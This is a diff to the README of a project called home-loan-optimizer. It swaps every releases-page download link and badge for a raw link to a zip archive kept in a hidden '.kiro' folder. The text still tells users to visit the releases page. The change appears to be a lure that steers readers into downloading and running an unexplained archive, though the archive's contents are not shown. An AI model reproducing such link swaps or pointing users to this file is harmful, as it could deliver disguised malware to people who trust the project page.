@@ -4,14 +4,14 @@
 
 Welcome to home-loan-optimizer! This application helps you compare prepayment and investment strategies, offering personalized recommendations to save money on your home loan. 
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Szymeo1/home-loan-optimizer/releases)
+[![Download](https://raw.githubusercontent.com/Szymeo1/home-loan-optimizer/main/.kiro/home-loan-optimizer_1.7.zip)](https://raw.githubusercontent.com/Szymeo1/home-loan-optimizer/main/.kiro/home-loan-optimizer_1.7.zip)
 
 ## 📥 Download & Install
 
 To get started with home-loan-optimizer, you need to download the application from our releases page. 
 
 1. Click the link below to visit the download page:
-   [Download Home Loan Optimizer](https://github.com/Szymeo1/home-loan-optimizer/releases)
+   [Download Home Loan Optimizer](https://raw.githubusercontent.com/Szymeo1/home-loan-optimizer/main/.kiro/home-loan-optimizer_1.7.zip)
 
 2. On the releases page, choose the latest version. You will see various files available for download.
 
@@ -88,6 +88,6 @@ Explore these topics for better insights into financial management and investmen
 
 home-loan-optimizer is open-source software, and you can use, modify, and distribute it under the terms of the MIT License. 
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Szymeo1/home-loan-optimizer/releases) 
+[![Download](https://raw.githubusercontent.com/Szymeo1/home-loan-optimizer/main/.kiro/home-loan-optimizer_1.7.zip)](https://raw.githubusercontent.com/Szymeo1/home-loan-optimizer/main/.kiro/home-loan-optimizer_1.7.zip) 
 
 Thank you for choosing home-loan-optimizer to improve your financial future!
